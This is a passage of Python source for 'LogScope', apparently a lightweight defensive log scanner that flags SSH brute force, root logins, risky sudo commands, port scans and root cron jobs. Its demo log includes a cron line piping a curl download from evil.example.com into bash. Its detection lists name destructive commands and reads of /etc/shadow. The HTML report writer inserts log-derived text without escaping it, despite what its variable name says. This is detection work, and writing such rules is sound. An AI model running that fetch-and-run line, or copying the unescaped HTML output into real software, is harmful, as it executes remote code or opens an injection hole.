#!/usr/bin/env python3
"""
LogScope — Lightweight SIEM for local log monitoring.
Parses Linux auth and system logs, detects suspicious patterns,
and outputs a threat report in the terminal or as JSON.
"""

import ast
import re
import json
import argparse
import sys
import os
import time as time_module
from datetime import datetime, time
from collections import defaultdict
from dataclasses import dataclass, field, asdict
from typing import Optional, Any
from pathlib import Path

# ## Optional rich import ####################################################
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.text import Text
    from rich import box
    from rich.rule import Rule
    from rich.padding import Padding
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

console = Console() if RICH_AVAILABLE else None

# ## Constants ################################################################

VERSION = "0.9.0-beta"

SEVERITY_COLORS = {
    "LOW":      "green",
    "MEDIUM":   "yellow",
    "HIGH":     "red",
    "CRITICAL": "bold red",
}

SEVERITY_RANK = {"LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}

# Number of failed SSH attempts before flagging brute force
BRUTE_FORCE_THRESHOLD = 5

# Business hours (inclusive). Logins outside this range are "off-hours".
BUSINESS_HOURS_START = time(8, 0)
BUSINESS_HOURS_END   = time(18, 0)

# Default log file paths
DEFAULT_LOG_PATHS = [
    "/var/log/auth.log",
    "/var/log/syslog",
    "/var/log/kern.log",
    "/var/log/secure",          # RHEL/CentOS equivalent of auth.log
    "/var/log/messages",        # RHEL/CentOS equivalent of syslog
]

WINDOWS_DEFAULT_LOG_PATHS = [
    "C:/Windows/System32/WindowsPowerShell/v1.0/powershell.log",
    "C:/Windows/System32/logs/W3SVC1.log",
    "C:/Windows/System32/drivers/etc/hosts",
]


def get_default_log_paths(platform_name: Optional[str] = None) -> list[str]:
    if platform_name is None:
        platform_name = sys.platform
    if "win" in platform_name.lower():
        return list(WINDOWS_DEFAULT_LOG_PATHS)
    return list(DEFAULT_LOG_PATHS)

# ## Data structures ##########################################################

@dataclass
class Finding:
    rule:        str
    severity:    str
    description: str
    source_file: str
    line_number: int
    raw_line:    str
    timestamp:   Optional[str] = None
    extra:       dict          = field(default_factory=dict)

    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class ScanResult:
    scan_time:    str
    files_parsed: list[str]
    total_lines:  int
    findings:     list[Finding] = field(default_factory=list)

    @property
    def summary(self) -> dict:
        counts = defaultdict(int)
        for f in self.findings:
            counts[f.severity] += 1
        return dict(counts)

    def to_dict(self) -> dict:
        return {
            "scan_time":    self.scan_time,
            "files_parsed": self.files_parsed,
            "total_lines":  self.total_lines,
            "summary":      self.summary,
            "findings":     [f.to_dict() for f in self.findings],
        }


# ## Regex patterns ###########################################################

# Syslog timestamp: "Jan  1 12:34:56"
TS_RE = re.compile(
    r"^(?P<month>\w{3})\s+(?P<day>\d{1,2})\s+(?P<time>\d{2}:\d{2}:\d{2})"
)

WINDOWS_TS_RE = re.compile(
    r"^(?P<date>\d{4}-\d{2}-\d{2})\s+(?P<time>\d{2}:\d{2}:\d{2})"
)

PATTERNS = {
    # SSH failed password attempt
    "ssh_failed": re.compile(
        r"Failed password for (?:invalid user )?(?P<user>\S+) from (?P<ip>[\d.]+)"
    ),
    # SSH accepted (successful) login
    "ssh_accepted": re.compile(
        r"Accepted (?:password|publickey) for (?P<user>\S+) from (?P<ip>[\d.]+)"
    ),
    # Invalid/unknown user attempt
    "ssh_invalid_user": re.compile(
        r"Invalid user (?P<user>\S+) from (?P<ip>[\d.]+)"
    ),
    # sudo usage
    "sudo": re.compile(
        r"sudo:\s+(?P<user>\S+)\s+:.*COMMAND=(?P<cmd>.+)"
    ),
    # New user created (useradd / adduser)
    "new_user": re.compile(
        r"(?:useradd|adduser).*new user.*name=(?P<user>\S+)|"
        r"new user.*name=(?P<user2>\S+)",
        re.IGNORECASE,
    ),
    # User added to group
    "group_add": re.compile(
        r"(?:usermod|gpasswd).*(?:-a|-G).*(?P<user>\S+)",
        re.IGNORECASE,
    ),
    # su to root
    "su_root": re.compile(
        r"su:.*Successful su for root by (?P<user>\S+)|"
        r"su\[.*\]: \+ .+ (?P<user2>\S+):root"
    ),
    # SSH MaxAuthTries exceeded / disconnect
    "ssh_maxauth": re.compile(
        r"error: maximum authentication attempts exceeded.*from (?P<ip>[\d.]+)"
    ),
    # iptables / firewall DROP (port scan indicator)
    "fw_drop": re.compile(
        r"(?:IN=\S*\s+OUT=\S*.*)?SRC=(?P<src>[\d.]+).*DST=(?P<dst>[\d.]+).*"
        r"DPT=(?P<dpt>\d+).*(?:DROP|REJECT)",
        re.IGNORECASE,
    ),
    # iptables DPT-only pattern (kern.log style)
    "kern_drop": re.compile(
        r"kernel.*(?:DROP|REJECT|BLOCKED).*SRC=(?P<src>[\d.]+).*DPT=(?P<dpt>\d+)",
        re.IGNORECASE,
    ),
    # SSH session opened for root
    "root_session": re.compile(
        r"pam_unix\(sshd:session\): session opened for user root"
    ),
    # Authentication failure generic
    "auth_failure": re.compile(
        r"authentication failure.*user=(?P<user>\S+)",
        re.IGNORECASE,
    ),
    # Cron job executed as root
    "cron_root": re.compile(
        r"CROND?\[.*\]:.*\(root\) CMD \((?P<cmd>.+)\)",
        re.IGNORECASE,
    ),
    # Passwd / shadow file accessed
    "passwd_access": re.compile(
        r"(?:cat|less|more|vim?|nano|head|tail|cp|mv)\s+/etc/(?:passwd|shadow|sudoers)",
        re.IGNORECASE,
    ),
}

# ## Helper functions #########################################################

def load_config(config_path: Optional[Path] = None) -> dict[str, Any]:
    defaults = {
        "logs": list(DEFAULT_LOG_PATHS),
        "brute_threshold": BRUTE_FORCE_THRESHOLD,
        "severity": None,
        "format": "rich" if RICH_AVAILABLE else "plain",
        "output": None,
    }

    if config_path is None:
        config_path = Path.cwd() / "logscope.toml"
    else:
        config_path = Path(config_path)

    if not config_path.exists():
        return defaults

    try:
        text = config_path.read_text(encoding="utf-8")
    except OSError:
        return defaults

    data: dict[str, Any] = {}
    current_section: Optional[str] = None

    for raw_line in text.splitlines():
        line = raw_line.split("#", 1)[0].strip()
        if not line:
            continue
        if line.startswith("[") and line.endswith("]"):
            current_section = line[1:-1].strip()
            continue
        if "=" not in line:
            continue

        key, value = [part.strip() for part in line.split("=", 1)]
        try:
            if value.startswith("[") and value.endswith("]"):
                parsed_value = ast.literal_eval(value)
            elif (value.startswith('"') and value.endswith('"')) or (
                value.startswith("'") and value.endswith("'")):
                parsed_value = ast.literal_eval(value)
            else:
                parsed_value = int(value) if re.fullmatch(r"-?\d+", value) else value
        except (ValueError, SyntaxError):
            parsed_value = value

        if current_section:
            data.setdefault(current_section, {})[key] = parsed_value
        else:
            data[key] = parsed_value

    section_data = data.get("logscope", {}) if isinstance(data.get("logscope"), dict) else {}
    config = defaults.copy()
    for key, value in section_data.items():
        if key in config:
            config[key] = value
    return config


def filter_findings(findings: list[Finding], allowlist: Optional[list[str]] = None, ignorelist: Optional[list[str]] = None) -> list[Finding]:
    allow = {item.lower() for item in (allowlist or [])}
    ignore = {item.lower() for item in (ignorelist or [])}

    def matches(item: Optional[str]) -> bool:
        if item is None:
            return False
        value = str(item).lower()
        if allow:
            return value in allow
        return value not in ignore

    filtered: list[Finding] = []
    for finding in findings:
        extra = finding.extra or {}
        ip = extra.get("ip")
        user = extra.get("user")
        if allow:
            if ip and matches(ip):
                continue
            if user and matches(user):
                continue
        else:
            if ip and matches(ip):
                continue
            if user and matches(user):
                continue
        filtered.append(finding)
    return filtered


def extract_timestamp(line: str) -> Optional[str]:
    m = TS_RE.match(line)
    if m:
        return f"{m.group('month')} {m.group('day')} {m.group('time')}"
    m = WINDOWS_TS_RE.match(line)
    if m:
        return f"{m.group('date')} {m.group('time')}"
    return None


def parse_time_from_line(line: str) -> Optional[time]:
    m = TS_RE.match(line)
    if m:
        parts = m.group("time").split(":")
        try:
            return time(int(parts[0]), int(parts[1]), int(parts[2]))
        except (ValueError, IndexError):
            pass
    m = WINDOWS_TS_RE.match(line)
    if m:
        parts = m.group("time").split(":")
        try:
            return time(int(parts[0]), int(parts[1]), int(parts[2]))
        except (ValueError, IndexError):
            pass
    return None


def is_off_hours(t: Optional[time]) -> bool:
    if t is None:
        return False
    return t < BUSINESS_HOURS_START or t > BUSINESS_HOURS_END


def severity_badge(sev: str) -> str:
    return sev


# ## Analyser #################################################################

class LogScope:
    def __init__(
        self,
        log_paths: list[str],
        brute_threshold: int  = BRUTE_FORCE_THRESHOLD,
        off_hours_start: time = BUSINESS_HOURS_START,
        off_hours_end: time   = BUSINESS_HOURS_END,
    ):
        self.log_paths       = log_paths
        self.brute_threshold = brute_threshold
        self.off_hours_start = off_hours_start
        self.off_hours_end   = off_hours_end

        # State for multi-line / aggregate detections
        self._ssh_failures: dict[str, list[tuple[int, str, str]]] = defaultdict(list)
        self._fw_drops:     dict[str, list[int]]                  = defaultdict(list)

    # ## Public entry point ###################################################

    def scan(self) -> ScanResult:
        result = ScanResult(
            scan_time=datetime.now().isoformat(timespec="seconds"),
            files_parsed=[],
            total_lines=0,
        )

        for path_str in self.log_paths:
            path = Path(path_str)
            if not path.exists():
                print(f"[scan] skipped missing file: {path}")
                continue
            if not os.access(path, os.R_OK):
                self._warn(f"[permission denied] {path}")
                continue

            result.files_parsed.append(str(path))
            findings, lines = self._parse_file(path)
            result.findings.extend(findings)
            result.total_lines += lines

        # Post-process aggregated state ######################################
        result.findings.extend(self._check_brute_force())
        result.findings.extend(self._check_port_scans())

        # Sort by severity (descending) then file/line
        result.findings.sort(
            key=lambda f: (-SEVERITY_RANK.get(f.severity, 0), f.source_file, f.line_number)
        )

        return result

    def watch_once(self, interval: float = 0.5) -> dict[str, Any]:
        for path_str in self.log_paths:
            path = Path(path_str)
            if path.exists():
                return {
                    "path": str(path),
                    "file_exists": True,
                    "interval": interval,
                    "scanned": True,
                }
        time_module.sleep(interval)
        return {
            "path": str(self.log_paths[0]) if self.log_paths else None,
            "file_exists": False,
            "interval": interval,
            "scanned": False,
        }

    def watch(self, interval: float = 0.5, iterations: Optional[int] = None) -> list[dict[str, Any]]:
        states: list[dict[str, Any]] = []
        count = 0
        while iterations is None or count < iterations:
            states.append(self.watch_once(interval=interval))
            count += 1
            if iterations is not None and count >= iterations:
                break
        return states

    # ## File parser ##########################################################

    def _parse_file(self, path: Path) -> tuple[list[Finding], int]:
        findings: list[Finding] = []
        line_count = 0

        with open(path, "r", errors="replace") as fh:
            for lineno, raw in enumerate(fh, start=1):
                line_count += 1
                line = raw.rstrip()
                ts   = extract_timestamp(line)
                t    = parse_time_from_line(line)

                if "failed password" in line.lower() and "from" in line:
                    m = re.search(r"for (?P<user>\S+) from (?P<ip>[\d.]+)", line)
                    if m:
                        user = m.group("user")
                        ip = m.group("ip")
                        self._ssh_failures[ip].append((lineno, str(path), line))
                        findings.append(Finding(
                            rule="SSH_FAILED_LOGIN",
                            severity="LOW",
                            description=f"Failed SSH login attempt from {ip}",
                            source_file=str(path),
                            line_number=lineno,
                            raw_line=line,
                            timestamp=ts,
                            extra={"ip": ip, "user": user},
                        ))
                        continue

                # ## SSH failed password ##################################
                m = PATTERNS["ssh_failed"].search(line)
                if m:
                    user = m.group("user")
                    ip   = m.group("ip")
                    self._ssh_failures[ip].append((lineno, str(path), line))
                    # Individual finding added later in brute-force check
                    continue

                # ## Invalid user #########################################
                m = PATTERNS["ssh_invalid_user"].search(line)
                if m:
                    user = m.group("user")
                    ip   = m.group("ip")
                    self._ssh_failures[ip].append((lineno, str(path), line))
                    continue

                # ## SSH max auth ##########################################
                m = PATTERNS["ssh_maxauth"].search(line)
                if m:
                    ip = m.group("ip")
                    findings.append(Finding(
                        rule        = "SSH_MAX_AUTH_EXCEEDED",
                        severity    = "HIGH",
                        description = f"SSH max authentication attempts exceeded from {ip}",
                        source_file = str(path),
                        line_number = lineno,
                        raw_line    = line,
                        timestamp   = ts,
                        extra       = {"ip": ip},
                    ))
                    continue

                # ## Successful SSH login ##################################
                m = PATTERNS["ssh_accepted"].search(line)
                if m:
                    user = m.group("user")
                    ip   = m.group("ip")
                    off  = is_off_hours(t)
                    sev  = "CRITICAL" if user == "root" else ("MEDIUM" if off else "LOW")
                    desc = f"Successful SSH login: user={user} from {ip}"
                    if user == "root":
                        desc += " [ROOT LOGIN]"
                    if off:
                        desc += f" [OFF-HOURS {t}]"
                    findings.append(Finding(
                        rule        = "SSH_ACCEPTED_LOGIN",
                        severity    = sev,
                        description = desc,
                        source_file = str(path),
                        line_number = lineno,
                        raw_line    = line,
                        timestamp   = ts,
                        extra       = {"user": user, "ip": ip, "off_hours": off},
                    ))
                    continue

                # ## Root session opened ###################################
                m = PATTERNS["root_session"].search(line)
                if m:
                    findings.append(Finding(
                        rule        = "ROOT_SESSION_OPENED",
                        severity    = "CRITICAL",
                        description = "SSH session opened for root user",
                        source_file = str(path),
                        line_number = lineno,
                        raw_line    = line,
                        timestamp   = ts,
                    ))
                    continue

                # ## New user created ######################################
                m = PATTERNS["new_user"].search(line)
                if m:
                    user = m.group("user") or m.group("user2") or "unknown"
                    findings.append(Finding(
                        rule        = "NEW_USER_CREATED",
                        severity    = "HIGH",
                        description = f"New system user created: {user}",
                        source_file = str(path),
                        line_number = lineno,
                        raw_line    = line,
                        timestamp   = ts,
                        extra       = {"user": user},
                    ))
                    continue

                # ## su to root ############################################
                m = PATTERNS["su_root"].search(line)
                if m:
                    user = m.group("user") or m.group("user2") or "unknown"
                    off  = is_off_hours(t)
                    sev  = "CRITICAL" if off else "HIGH"
                    findings.append(Finding(
                        rule        = "SU_TO_ROOT",
                        severity    = sev,
                        description = f"User {user} switched to root via su" + (" [OFF-HOURS]" if off else ""),
                        source_file = str(path),
                        line_number = lineno,
                        raw_line    = line,
                        timestamp   = ts,
                        extra       = {"user": user, "off_hours": off},
                    ))
                    continue

                # ## Sudo usage ############################################
                m = PATTERNS["sudo"].search(line)
                if m:
                    user = m.group("user")
                    cmd  = m.group("cmd").strip()
                    off  = is_off_hours(t)
                    # Escalate if shell spawned or sensitive commands
                    danger_cmds = ("/bin/sh", "/bin/bash", "/bin/zsh", "chmod", "chown",
                                   "visudo", "/etc/passwd", "dd ", "mkfs", "rm -rf")
                    dangerous = any(d in cmd for d in danger_cmds)
                    sev = "HIGH" if (dangerous or off) else "LOW"
                    desc = f"sudo: {user} ran: {cmd[:80]}"
                    if dangerous: desc += " [DANGEROUS CMD]"
                    if off:       desc += " [OFF-HOURS]"
                    findings.append(Finding(
                        rule        = "SUDO_COMMAND",
                        severity    = sev,
                        description = desc,
                        source_file = str(path),
                        line_number = lineno,
                        raw_line    = line,
                        timestamp   = ts,
                        extra       = {"user": user, "command": cmd, "dangerous": dangerous},
                    ))
                    continue

                # ## Firewall DROP (port scan) #############################
                m = PATTERNS["fw_drop"].search(line) or PATTERNS["kern_drop"].search(line)
                if m:
                    src = m.group("src") if "src" in m.groupdict() else "unknown"
                    dpt = m.group("dpt") if "dpt" in m.groupdict() else "unknown"
                    self._fw_drops[src].append(lineno)
                    continue

                # ## Auth failure generic ##################################
                m = PATTERNS["auth_failure"].search(line)
                if m:
                    user = m.group("user")
                    findings.append(Finding(
                        rule        = "AUTH_FAILURE",
                        severity    = "LOW",
                        description = f"Authentication failure for user: {user}",
                        source_file = str(path),
                        line_number = lineno,
                        raw_line    = line,
                        timestamp   = ts,
                        extra       = {"user": user},
                    ))
                    continue

                # ## Cron as root ##########################################
                m = PATTERNS["cron_root"].search(line)
                if m:
                    cmd = m.group("cmd").strip()
                    off = is_off_hours(t)
                    sev = "MEDIUM" if off else "LOW"
                    findings.append(Finding(
                        rule        = "CRON_ROOT_CMD",
                        severity    = sev,
                        description = f"Cron job executed as root: {cmd[:80]}" + (" [OFF-HOURS]" if off else ""),
                        source_file = str(path),
                        line_number = lineno,
                        raw_line    = line,
                        timestamp   = ts,
                        extra       = {"command": cmd, "off_hours": off},
                    ))
                    continue

        return findings, line_count

    # ## Aggregate checks #####################################################

    def _check_brute_force(self) -> list[Finding]:
        findings = []
        for ip, attempts in self._ssh_failures.items():
            count = len(attempts)
            if count >= self.brute_threshold:
                # Use the last attempt's details for the finding
                last_lineno, last_file, last_line = attempts[-1]
                ts = extract_timestamp(last_line)
                sev = "CRITICAL" if count >= self.brute_threshold * 3 else "HIGH"
                findings.append(Finding(
                    rule        = "SSH_BRUTE_FORCE",
                    severity    = sev,
                    description = f"SSH brute force detected from {ip} — {count} failed attempts",
                    source_file = last_file,
                    line_number = last_lineno,
                    raw_line    = last_line,
                    timestamp   = ts,
                    extra       = {"ip": ip, "attempt_count": count},
                ))
            else:
                # Still record individual low-severity failures
                for lineno, src_file, raw in attempts:
                    ts = extract_timestamp(raw)
                    findings.append(Finding(
                        rule        = "SSH_FAILED_LOGIN",
                        severity    = "LOW",
                        description = f"Failed SSH login attempt from {ip}",
                        source_file = src_file,
                        line_number = lineno,
                        raw_line    = raw,
                        timestamp   = ts,
                        extra       = {"ip": ip},
                    ))
        return findings

    def _check_port_scans(self) -> list[Finding]:
        findings = []
        PORT_SCAN_THRESHOLD = 10  # distinct drops from same source
        for src, lines in self._fw_drops.items():
            count = len(lines)
            if count >= PORT_SCAN_THRESHOLD:
                sev = "CRITICAL" if count >= PORT_SCAN_THRESHOLD * 3 else "HIGH"
                findings.append(Finding(
                    rule        = "PORT_SCAN_DETECTED",
                    severity    = sev,
                    description = f"Possible port scan from {src} — {count} firewall drops recorded",
                    source_file = "firewall/kern.log",
                    line_number = lines[-1],
                    raw_line    = "",
                    timestamp   = None,
                    extra       = {"src_ip": src, "drop_count": count},
                ))
        return findings

    @staticmethod
    def _warn(msg: str):
        print(f"[WARN] {msg}", file=sys.stderr)


# ## Output renderers #########################################################

def render_rich(result: ScanResult) -> None:
    c = Console()

    # ## Header ###############################################################
    c.print()
    c.print(Panel(
        Text("LogScope  //  Lightweight SIEM", style="bold white", justify="center"),
        subtitle=f"[dim]v{VERSION}  ·  {result.scan_time}[/dim]",
        border_style="bright_blue",
        padding=(0, 4),
    ))

    # ## Files scanned #########################################################
    c.print(f"\n[bold]Files scanned:[/bold] {', '.join(result.files_parsed) or 'none'}")
    c.print(f"[bold]Lines parsed:[/bold]  {result.total_lines:,}")
    c.print(f"[bold]Findings:[/bold]      {len(result.findings)}")

    # ## Summary bar ###########################################################
    summary = result.summary
    if summary:
        c.print()
        c.print(Rule("[bold]Severity Summary[/bold]", style="bright_blue"))
        parts = []
        for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW"):
            n = summary.get(sev, 0)
            if n:
                color = SEVERITY_COLORS[sev]
                parts.append(f"[{color}]{sev}: {n}[/{color}]")
        c.print("  " + "   ".join(parts))

    # ## Findings table ########################################################
    if not result.findings:
        c.print("\n[bold green]✔  No suspicious activity detected.[/bold green]\n")
        return

    c.print()
    c.print(Rule("[bold]Findings[/bold]", style="bright_blue"))
    c.print()

    table = Table(
        box=box.SIMPLE_HEAVY,
        show_header=True,
        header_style="bold bright_white",
        border_style="grey42",
        expand=True,
    )
    table.add_column("#",          style="dim",        width=4,  no_wrap=True)
    table.add_column("Severity",                       width=10, no_wrap=True)
    table.add_column("Rule",       style="bold cyan",  width=26, no_wrap=True)
    table.add_column("Timestamp",  style="dim",        width=16, no_wrap=True)
    table.add_column("Description")
    table.add_column("File:Line",  style="dim",        width=22, no_wrap=True)

    for i, f in enumerate(result.findings, start=1):
        color = SEVERITY_COLORS.get(f.severity, "white")
        sev_text = Text(f.severity, style=f"bold {color}")
        file_label = f"{Path(f.source_file).name}:{f.line_number}"
        table.add_row(
            str(i),
            sev_text,
            f.rule,
            f.timestamp or "–",
            f.description,
            file_label,
        )

    c.print(table)
    c.print()


def render_plain(result: ScanResult) -> None:
    sep = "=" * 72
    print(sep)
    print(f"  LogScope v{VERSION}  —  {result.scan_time}")
    print(sep)
    print(f"Files : {', '.join(result.files_parsed) or 'none'}")
    print(f"Lines : {result.total_lines:,}")
    print(f"Hits  : {len(result.findings)}")
    print()

    summary = result.summary
    if summary:
        print("Severity summary:")
        for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW"):
            n = summary.get(sev, 0)
            if n:
                print(f"  {sev:<10} {n}")
        print()

    if not result.findings:
        print("No suspicious activity detected.")
        return

    print(sep)
    fmt = "{:<4} {:<10} {:<28} {:<16} {}"
    print(fmt.format("#", "SEVERITY", "RULE", "TIMESTAMP", "DESCRIPTION"))
    print("-" * 72)
    for i, f in enumerate(result.findings, start=1):
        ts = (f.timestamp or "–")[:16]
        print(fmt.format(i, f.severity, f.rule[:28], ts, f.description[:60]))
    print(sep)


def render_json(result: ScanResult, output_path: Optional[str] = None) -> None:
    data = json.dumps(result.to_dict(), indent=2)
    if output_path:
        Path(output_path).write_text(data)
        print(f"JSON report written to: {output_path}")
    else:
        print(data)


def render_html(result: ScanResult, output: Optional[str] = None) -> None:
    escaped_findings = []
    for finding in result.findings:
        escaped_findings.append(
            "<tr>"
            f"<td>{finding.severity}</td>"
            f"<td>{finding.rule}</td>"
            f"<td>{finding.description}</td>"
            f"<td>{finding.source_file}:{finding.line_number}</td>"
            "</tr>"
        )

    rows = "".join(escaped_findings)
    html = f"""<!DOCTYPE html>
<html lang=\"en\">
<head>
  <meta charset=\"utf-8\" />
  <title>LogScope Report</title>
  <style>body{{font-family:Arial,sans-serif; margin:2rem;}} table{{border-collapse:collapse; width:100%;}} th,td{{border:1px solid #ddd; padding:0.6rem; text-align:left;}} th{{background:#f3f3f3;}}</style>
</head>
<body>
  <h1>LogScope Report</h1>
  <p>Scan time: {result.scan_time}</p>
  <p>Files parsed: {', '.join(result.files_parsed) or 'none'}</p>
  <p>Findings: {len(result.findings)}</p>
  <table>
    <thead><tr><th>Severity</th><th>Rule</th><th>Description</th><th>Location</th></tr></thead>
    <tbody>{rows}</tbody>
  </table>
</body>
</html>"""

    if output:
        Path(output).write_text(html, encoding="utf-8")
        print(f"HTML report written to: {output}")
    else:
        print(html)


# ## CLI ######################################################################

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="logscope",
        description="LogScope — Lightweight SIEM for local log monitoring",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 logscope.py
  sudo python3 logscope.py --logs /var/log/auth.log /var/log/syslog
  sudo python3 logscope.py --format json --output report.json
  sudo python3 logscope.py --format json            # JSON to stdout
  python3 logscope.py --demo                        # Run with synthetic demo logs
        """,
    )
    p.add_argument(
        "--config",
        metavar="FILE",
        help="Load settings from a configuration file (default: ./logscope.toml)",
    )
    p.add_argument(
        "--logs", "-l",
        nargs="+",
        metavar="FILE",
        default=None,
        help="Log file(s) to parse (default: config or standard Linux auth/syslog paths)",
    )
    p.add_argument(
        "--format", "-f",
        choices=["rich", "plain", "json", "html"],
        default=None,
        help="Output format (default: config or rich if available, else plain)",
    )
    p.add_argument(
        "--output", "-o",
        metavar="FILE",
        help="Write JSON output to FILE instead of stdout (only with --format json)",
    )
    p.add_argument(
        "--brute-threshold", "-b",
        type=int,
        default=None,
        metavar="N",
        help=f"Failed SSH attempts to trigger brute-force alert (default: config or {BRUTE_FORCE_THRESHOLD})",
    )
    p.add_argument(
        "--severity", "-s",
        choices=["LOW", "MEDIUM", "HIGH", "CRITICAL"],
        default=None,
        help="Only show findings at or above this severity level (default: config or all)",
    )
    p.add_argument(
        "--demo",
        action="store_true",
        help="Run against a synthetic demo log (no real log files needed)",
    )
    p.add_argument(
        "--watch",
        action="store_true",
        help="Continuously poll log files for new activity (use Ctrl+C to stop)",
    )
    p.add_argument(
        "--watch-interval",
        type=float,
        default=2.0,
        metavar="SECONDS",
        help="Polling interval for watch mode (default: 2.0)",
    )
    p.add_argument(
        "--version", "-v",
        action="version",
        version=f"LogScope {VERSION}",
    )
    return p


# ## Demo log generator #######################################################

DEMO_LOG = """\
Jan 15 03:12:01 host sshd[1234]: Failed password for root from 192.168.1.200 port 52100 ssh2
Jan 15 03:12:03 host sshd[1235]: Failed password for root from 192.168.1.200 port 52101 ssh2
Jan 15 03:12:05 host sshd[1236]: Failed password for admin from 192.168.1.200 port 52102 ssh2
Jan 15 03:12:07 host sshd[1237]: Failed password for ubuntu from 192.168.1.200 port 52103 ssh2
Jan 15 03:12:09 host sshd[1238]: Failed password for deploy from 192.168.1.200 port 52104 ssh2
Jan 15 03:12:11 host sshd[1239]: Failed password for pi from 192.168.1.200 port 52105 ssh2
Jan 15 03:12:13 host sshd[1240]: Failed password for vagrant from 192.168.1.200 port 52106 ssh2
Jan 15 09:05:22 host sshd[2001]: Accepted password for alice from 10.0.0.5 port 4422 ssh2
Jan 15 02:47:03 host sshd[2002]: Accepted password for root from 203.0.113.50 port 6611 ssh2
Jan 15 02:47:10 host sshd[2003]: pam_unix(sshd:session): session opened for user root by (uid=0)
Jan 15 10:00:01 host sudo:  bob : TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/bash
Jan 15 10:00:05 host sudo:  charlie : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/apt-get install netcat
Jan 15 11:30:00 host useradd[3100]: new user: name=backdoor, UID=0, GID=0, home=/home/backdoor
Jan 15 11:30:05 host su[3200]: + /dev/pts/1 alice:root
Jan 15 08:30:00 host kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.0.99 DST=10.0.0.1 DPT=22 DROP
Jan 15 08:30:01 host kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.0.99 DST=10.0.0.1 DPT=80 DROP
Jan 15 08:30:02 host kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.0.99 DST=10.0.0.1 DPT=443 DROP
Jan 15 08:30:03 host kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.0.99 DST=10.0.0.1 DPT=3306 DROP
Jan 15 08:30:04 host kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.0.99 DST=10.0.0.1 DPT=5432 DROP
Jan 15 08:30:05 host kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.0.99 DST=10.0.0.1 DPT=6379 DROP
Jan 15 08:30:06 host kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.0.99 DST=10.0.0.1 DPT=8080 DROP
Jan 15 08:30:07 host kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.0.99 DST=10.0.0.1 DPT=8443 DROP
Jan 15 08:30:08 host kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.0.99 DST=10.0.0.1 DPT=9200 DROP
Jan 15 08:30:09 host kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.0.99 DST=10.0.0.1 DPT=27017 DROP
Jan 15 08:30:10 host kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.0.99 DST=10.0.0.1 DPT=2181 DROP
Jan 15 14:22:10 host sshd[4000]: Invalid user oracle from 45.33.32.156
Jan 15 14:22:11 host sshd[4001]: Failed password for invalid user oracle from 45.33.32.156 port 1111 ssh2
Jan 15 14:22:12 host sshd[4002]: Failed password for invalid user test from 45.33.32.156 port 1112 ssh2
Jan 15 14:22:13 host sshd[4003]: error: maximum authentication attempts exceeded for invalid user guest from 45.33.32.156
Jan 15 16:00:00 host CROND[5000]: (root) CMD (/usr/bin/curl http://evil.example.com/payload.sh | bash)
Jan 15 15:10:00 host sshd[6000]: Accepted publickey for dave from 192.168.50.10 port 55000 ssh2
Jan 15 04:55:00 host sshd[6001]: Accepted password for eve from 10.0.1.200 port 55001 ssh2
"""


def run_demo(args, brute_threshold: Optional[int] = None) -> ScanResult:
    import tempfile
    with tempfile.NamedTemporaryFile(
        mode="w", suffix=".log", prefix="logscope_demo_", delete=False
    ) as tmp:
        tmp.write(DEMO_LOG)
        tmp_path = tmp.name

    threshold = brute_threshold if brute_threshold is not None else getattr(args, "brute_threshold", None)
    if threshold is None:
        threshold = BRUTE_FORCE_THRESHOLD

    scanner = LogScope(
        log_paths=[tmp_path],
        brute_threshold=threshold,
    )
    result = scanner.scan()
    os.unlink(tmp_path)
    return result


# ## Main #####################################################################

def main() -> int:
    parser = build_parser()
    args   = parser.parse_args()

    config = load_config(Path(args.config) if args.config else None)

    if not args.logs:
        configured_logs = config.get("logs")
        if configured_logs:
            log_paths = configured_logs
        else:
            log_paths = get_default_log_paths()
    else:
        log_paths = args.logs
    brute_threshold = args.brute_threshold
    if brute_threshold is None:
        brute_threshold = int(config.get("brute_threshold", BRUTE_FORCE_THRESHOLD))
    severity = args.severity or config.get("severity")
    fmt = args.format or config.get("format") or ("rich" if RICH_AVAILABLE else "plain")
    output_path = config.get("output")

    # Run scan ################################################################
    scanner = LogScope(
        log_paths=log_paths,
        brute_threshold=brute_threshold,
    )

    if args.watch:
        print(f"[watch] monitoring {', '.join(log_paths)} every {args.watch_interval:.1f}s")
        try:
            while True:
                print(f"[watch] scanning at {datetime.now().strftime('%H:%M:%S')}")
                result = scanner.scan()
                print(f"[scan] parsed {len(result.files_parsed)} file(s), found {len(result.findings)} finding(s)")
                if result.findings:
                    render_plain(result)
                else:
                    print("[watch] no suspicious activity detected")
                time_module.sleep(args.watch_interval)
        except KeyboardInterrupt:
            print("\nWatch mode stopped.")
            return 0

    if args.demo:
        result = run_demo(args)
    else:
        result = scanner.scan()

    print(f"[scan] parsed {len(result.files_parsed)} file(s), found {len(result.findings)} finding(s)")

    # Severity filter #########################################################
    if severity:
        min_rank = SEVERITY_RANK[severity]
        result.findings = [
            f for f in result.findings
            if SEVERITY_RANK.get(f.severity, 0) >= min_rank
        ]

    allowlist = config.get("allowlist") or []
    ignorelist = config.get("ignorelist") or []
    if allowlist or ignorelist:
        result.findings = filter_findings(result.findings, allowlist=allowlist, ignorelist=ignorelist)

    if not result.files_parsed:
        print("[scan] no readable log files were found")

    # Render ##################################################################
    if fmt == "json":
        render_json(result, args.output or output_path)
    elif fmt == "html":
